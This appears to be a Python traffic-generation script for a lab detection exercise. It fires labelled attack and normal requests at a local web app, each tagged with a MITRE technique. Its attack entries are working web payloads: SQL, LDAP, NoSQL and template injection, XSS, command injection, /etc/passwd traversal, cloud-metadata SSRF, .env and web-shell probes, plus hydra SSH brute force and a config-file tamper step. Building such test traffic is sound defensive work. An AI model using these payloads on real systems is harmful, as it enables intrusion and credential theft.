import subprocess
import time

TARGET = "http://192.168.1.17"

SCENARIOS = [
    {
        "name": "SQL Injection",
        "category": "attack",
        "mitre_technique": "T1190",
        "command": ["curl", "-s", f"{TARGET}/rest/products/search?q=test%27%20OR%201%3D1--"],
    },
    {
        "name": "XSS",
        "category": "attack",
        "mitre_technique": "T1059",
        "command": ["curl", "-s", f"{TARGET}/rest/products/search?q=%3Ciframe%20src%3D%22javascript:alert(1)%22%3E"],
    },
    {
        "name": "Scanner Tool Detected",
        "category": "attack",
        "mitre_technique": "T1595",
        "command": ["curl", "-s", "-A", "sqlmap/1.6", f"{TARGET}/rest/products/search?q=test"],
    },
    {
        "name": "Admin Panel Probing",
        "category": "attack",
        "mitre_technique": "T1595",
        "command": ["curl", "-s", f"{TARGET}/admin"],
    },
    {
        "name": "WordPress Scanning",
        "category": "attack",
        "mitre_technique": "T1595",
        "command": ["curl", "-s", f"{TARGET}/wp-admin"],
    },
    {
        "name": "Directory Traversal",
        "category": "attack",
        "mitre_technique": "T1083",
        "command": ["curl", "-s", "--path-as-is", f"{TARGET}/rest/../../../../etc/passwd"],
    },
    {
        "name": "Command Injection (semicolon)",
        "category": "attack",
        "mitre_technique": "T1059",
        "command": ["curl", "-s", f"{TARGET}/rest/products/search?q=test;cat"],
    },
    {
        "name": "Command Injection (backtick)",
        "category": "attack",
        "mitre_technique": "T1059",
        "command": ["curl", "-s", f"{TARGET}/rest/products/search?q=`whoami`"],
    },
    {
        "name": "Sensitive File Probe",
        "category": "attack",
        "mitre_technique": "T1552",
        "command": ["curl", "-s", f"{TARGET}/.env"],
    },
    {
        "name": "Web Shell Probe",
        "category": "attack",
        "mitre_technique": "T1505",
        "command": ["curl", "-s", f"{TARGET}/uploads/shell.php"],
    },
    {
        "name": "SSTI",
        "category": "attack",
        "mitre_technique": "T1190",
        "command": ["curl", "-s", f"{TARGET}/rest/products/search?q={{{{7*7}}}}{{{{config}}}}"],
    },
    {
        "name": "LDAP Injection",
        "category": "attack",
        "mitre_technique": "T1190",
        "command": ["curl", "-s", f"{TARGET}/rest/user/login?user=*)(uid=*))(|(uid=*"],
    },
    {
        "name": "SSRF Probe",
        "category": "attack",
        "mitre_technique": "T1190",
        "command": ["curl", "-s", f"{TARGET}/rest/products/search?q=http://169.254.169.254/latest/meta-data/"],
    },
    {
        "name": "NoSQL Injection",
        "category": "attack",
        "mitre_technique": "T1190",
        "command": ["curl", "-s", f"{TARGET}/rest/user/login?email[$gt]=&password[$gt]="],
    },
    {
        "name": "Fuzzing Payload",
        "category": "attack",
        "mitre_technique": "T1595",
        "command": ["bash", "-c", f"curl -s \"{TARGET}/rest/products/search?q=$(head -c 200 /dev/urandom | base64 | tr -d '\\n')\""],
    },
    {
        "name": "SSH Brute Force",
        "category": "attack",
        "mitre_technique": "T1110",
        "command": ["hydra", "-l", "webwatch", "-P", "/home/webwatch/wrong-passwords.txt", "ssh://192.168.1.17"],
    },
    {
        "name": "File Tamper",
        "category": "attack",
        "mitre_technique": "T1565",
        "command": ["sudo", "touch", "/etc/nginx/playbook-test-file.conf"],
    },
    {
        "name": "Normal: Browse Products",
        "category": "normal",
        "mitre_technique": None,
        "command": ["curl", "-s", f"{TARGET}/rest/products/search?q="],
    },
    {
        "name": "Normal: View Basket",
        "category": "normal",
        "mitre_technique": None,
        "command": ["curl", "-s", f"{TARGET}/rest/basket/1"],
    },
    {
        "name": "Normal: Score Board",
        "category": "normal",
        "mitre_technique": None,
        "command": ["curl", "-s", f"{TARGET}/api/Challenges/?name=Score%20Board"],
    },
    {
        "name": "Normal: Legitimate Search",
        "category": "normal",
        "mitre_technique": None,
        "command": ["curl", "-s", f"{TARGET}/rest/products/search?q=apple"],
    },
    {
        "name": "Normal: App Config",
        "category": "normal",
        "mitre_technique": None,
        "command": ["curl", "-s", f"{TARGET}/rest/admin/application-configuration"],
    },
]


def runScenario(scenario):
    print(f"Running: {scenario['name']} ({scenario['category']})")
    subprocess.run(scenario["command"], capture_output=True)
    time.sleep(2)


def runPlaybook():
    for scenario in SCENARIOS:
        runScenario(scenario)
    print(f"Playbook complete. {len(SCENARIOS)} scenarios run.")


if __name__ == "__main__":
    runPlaybook()
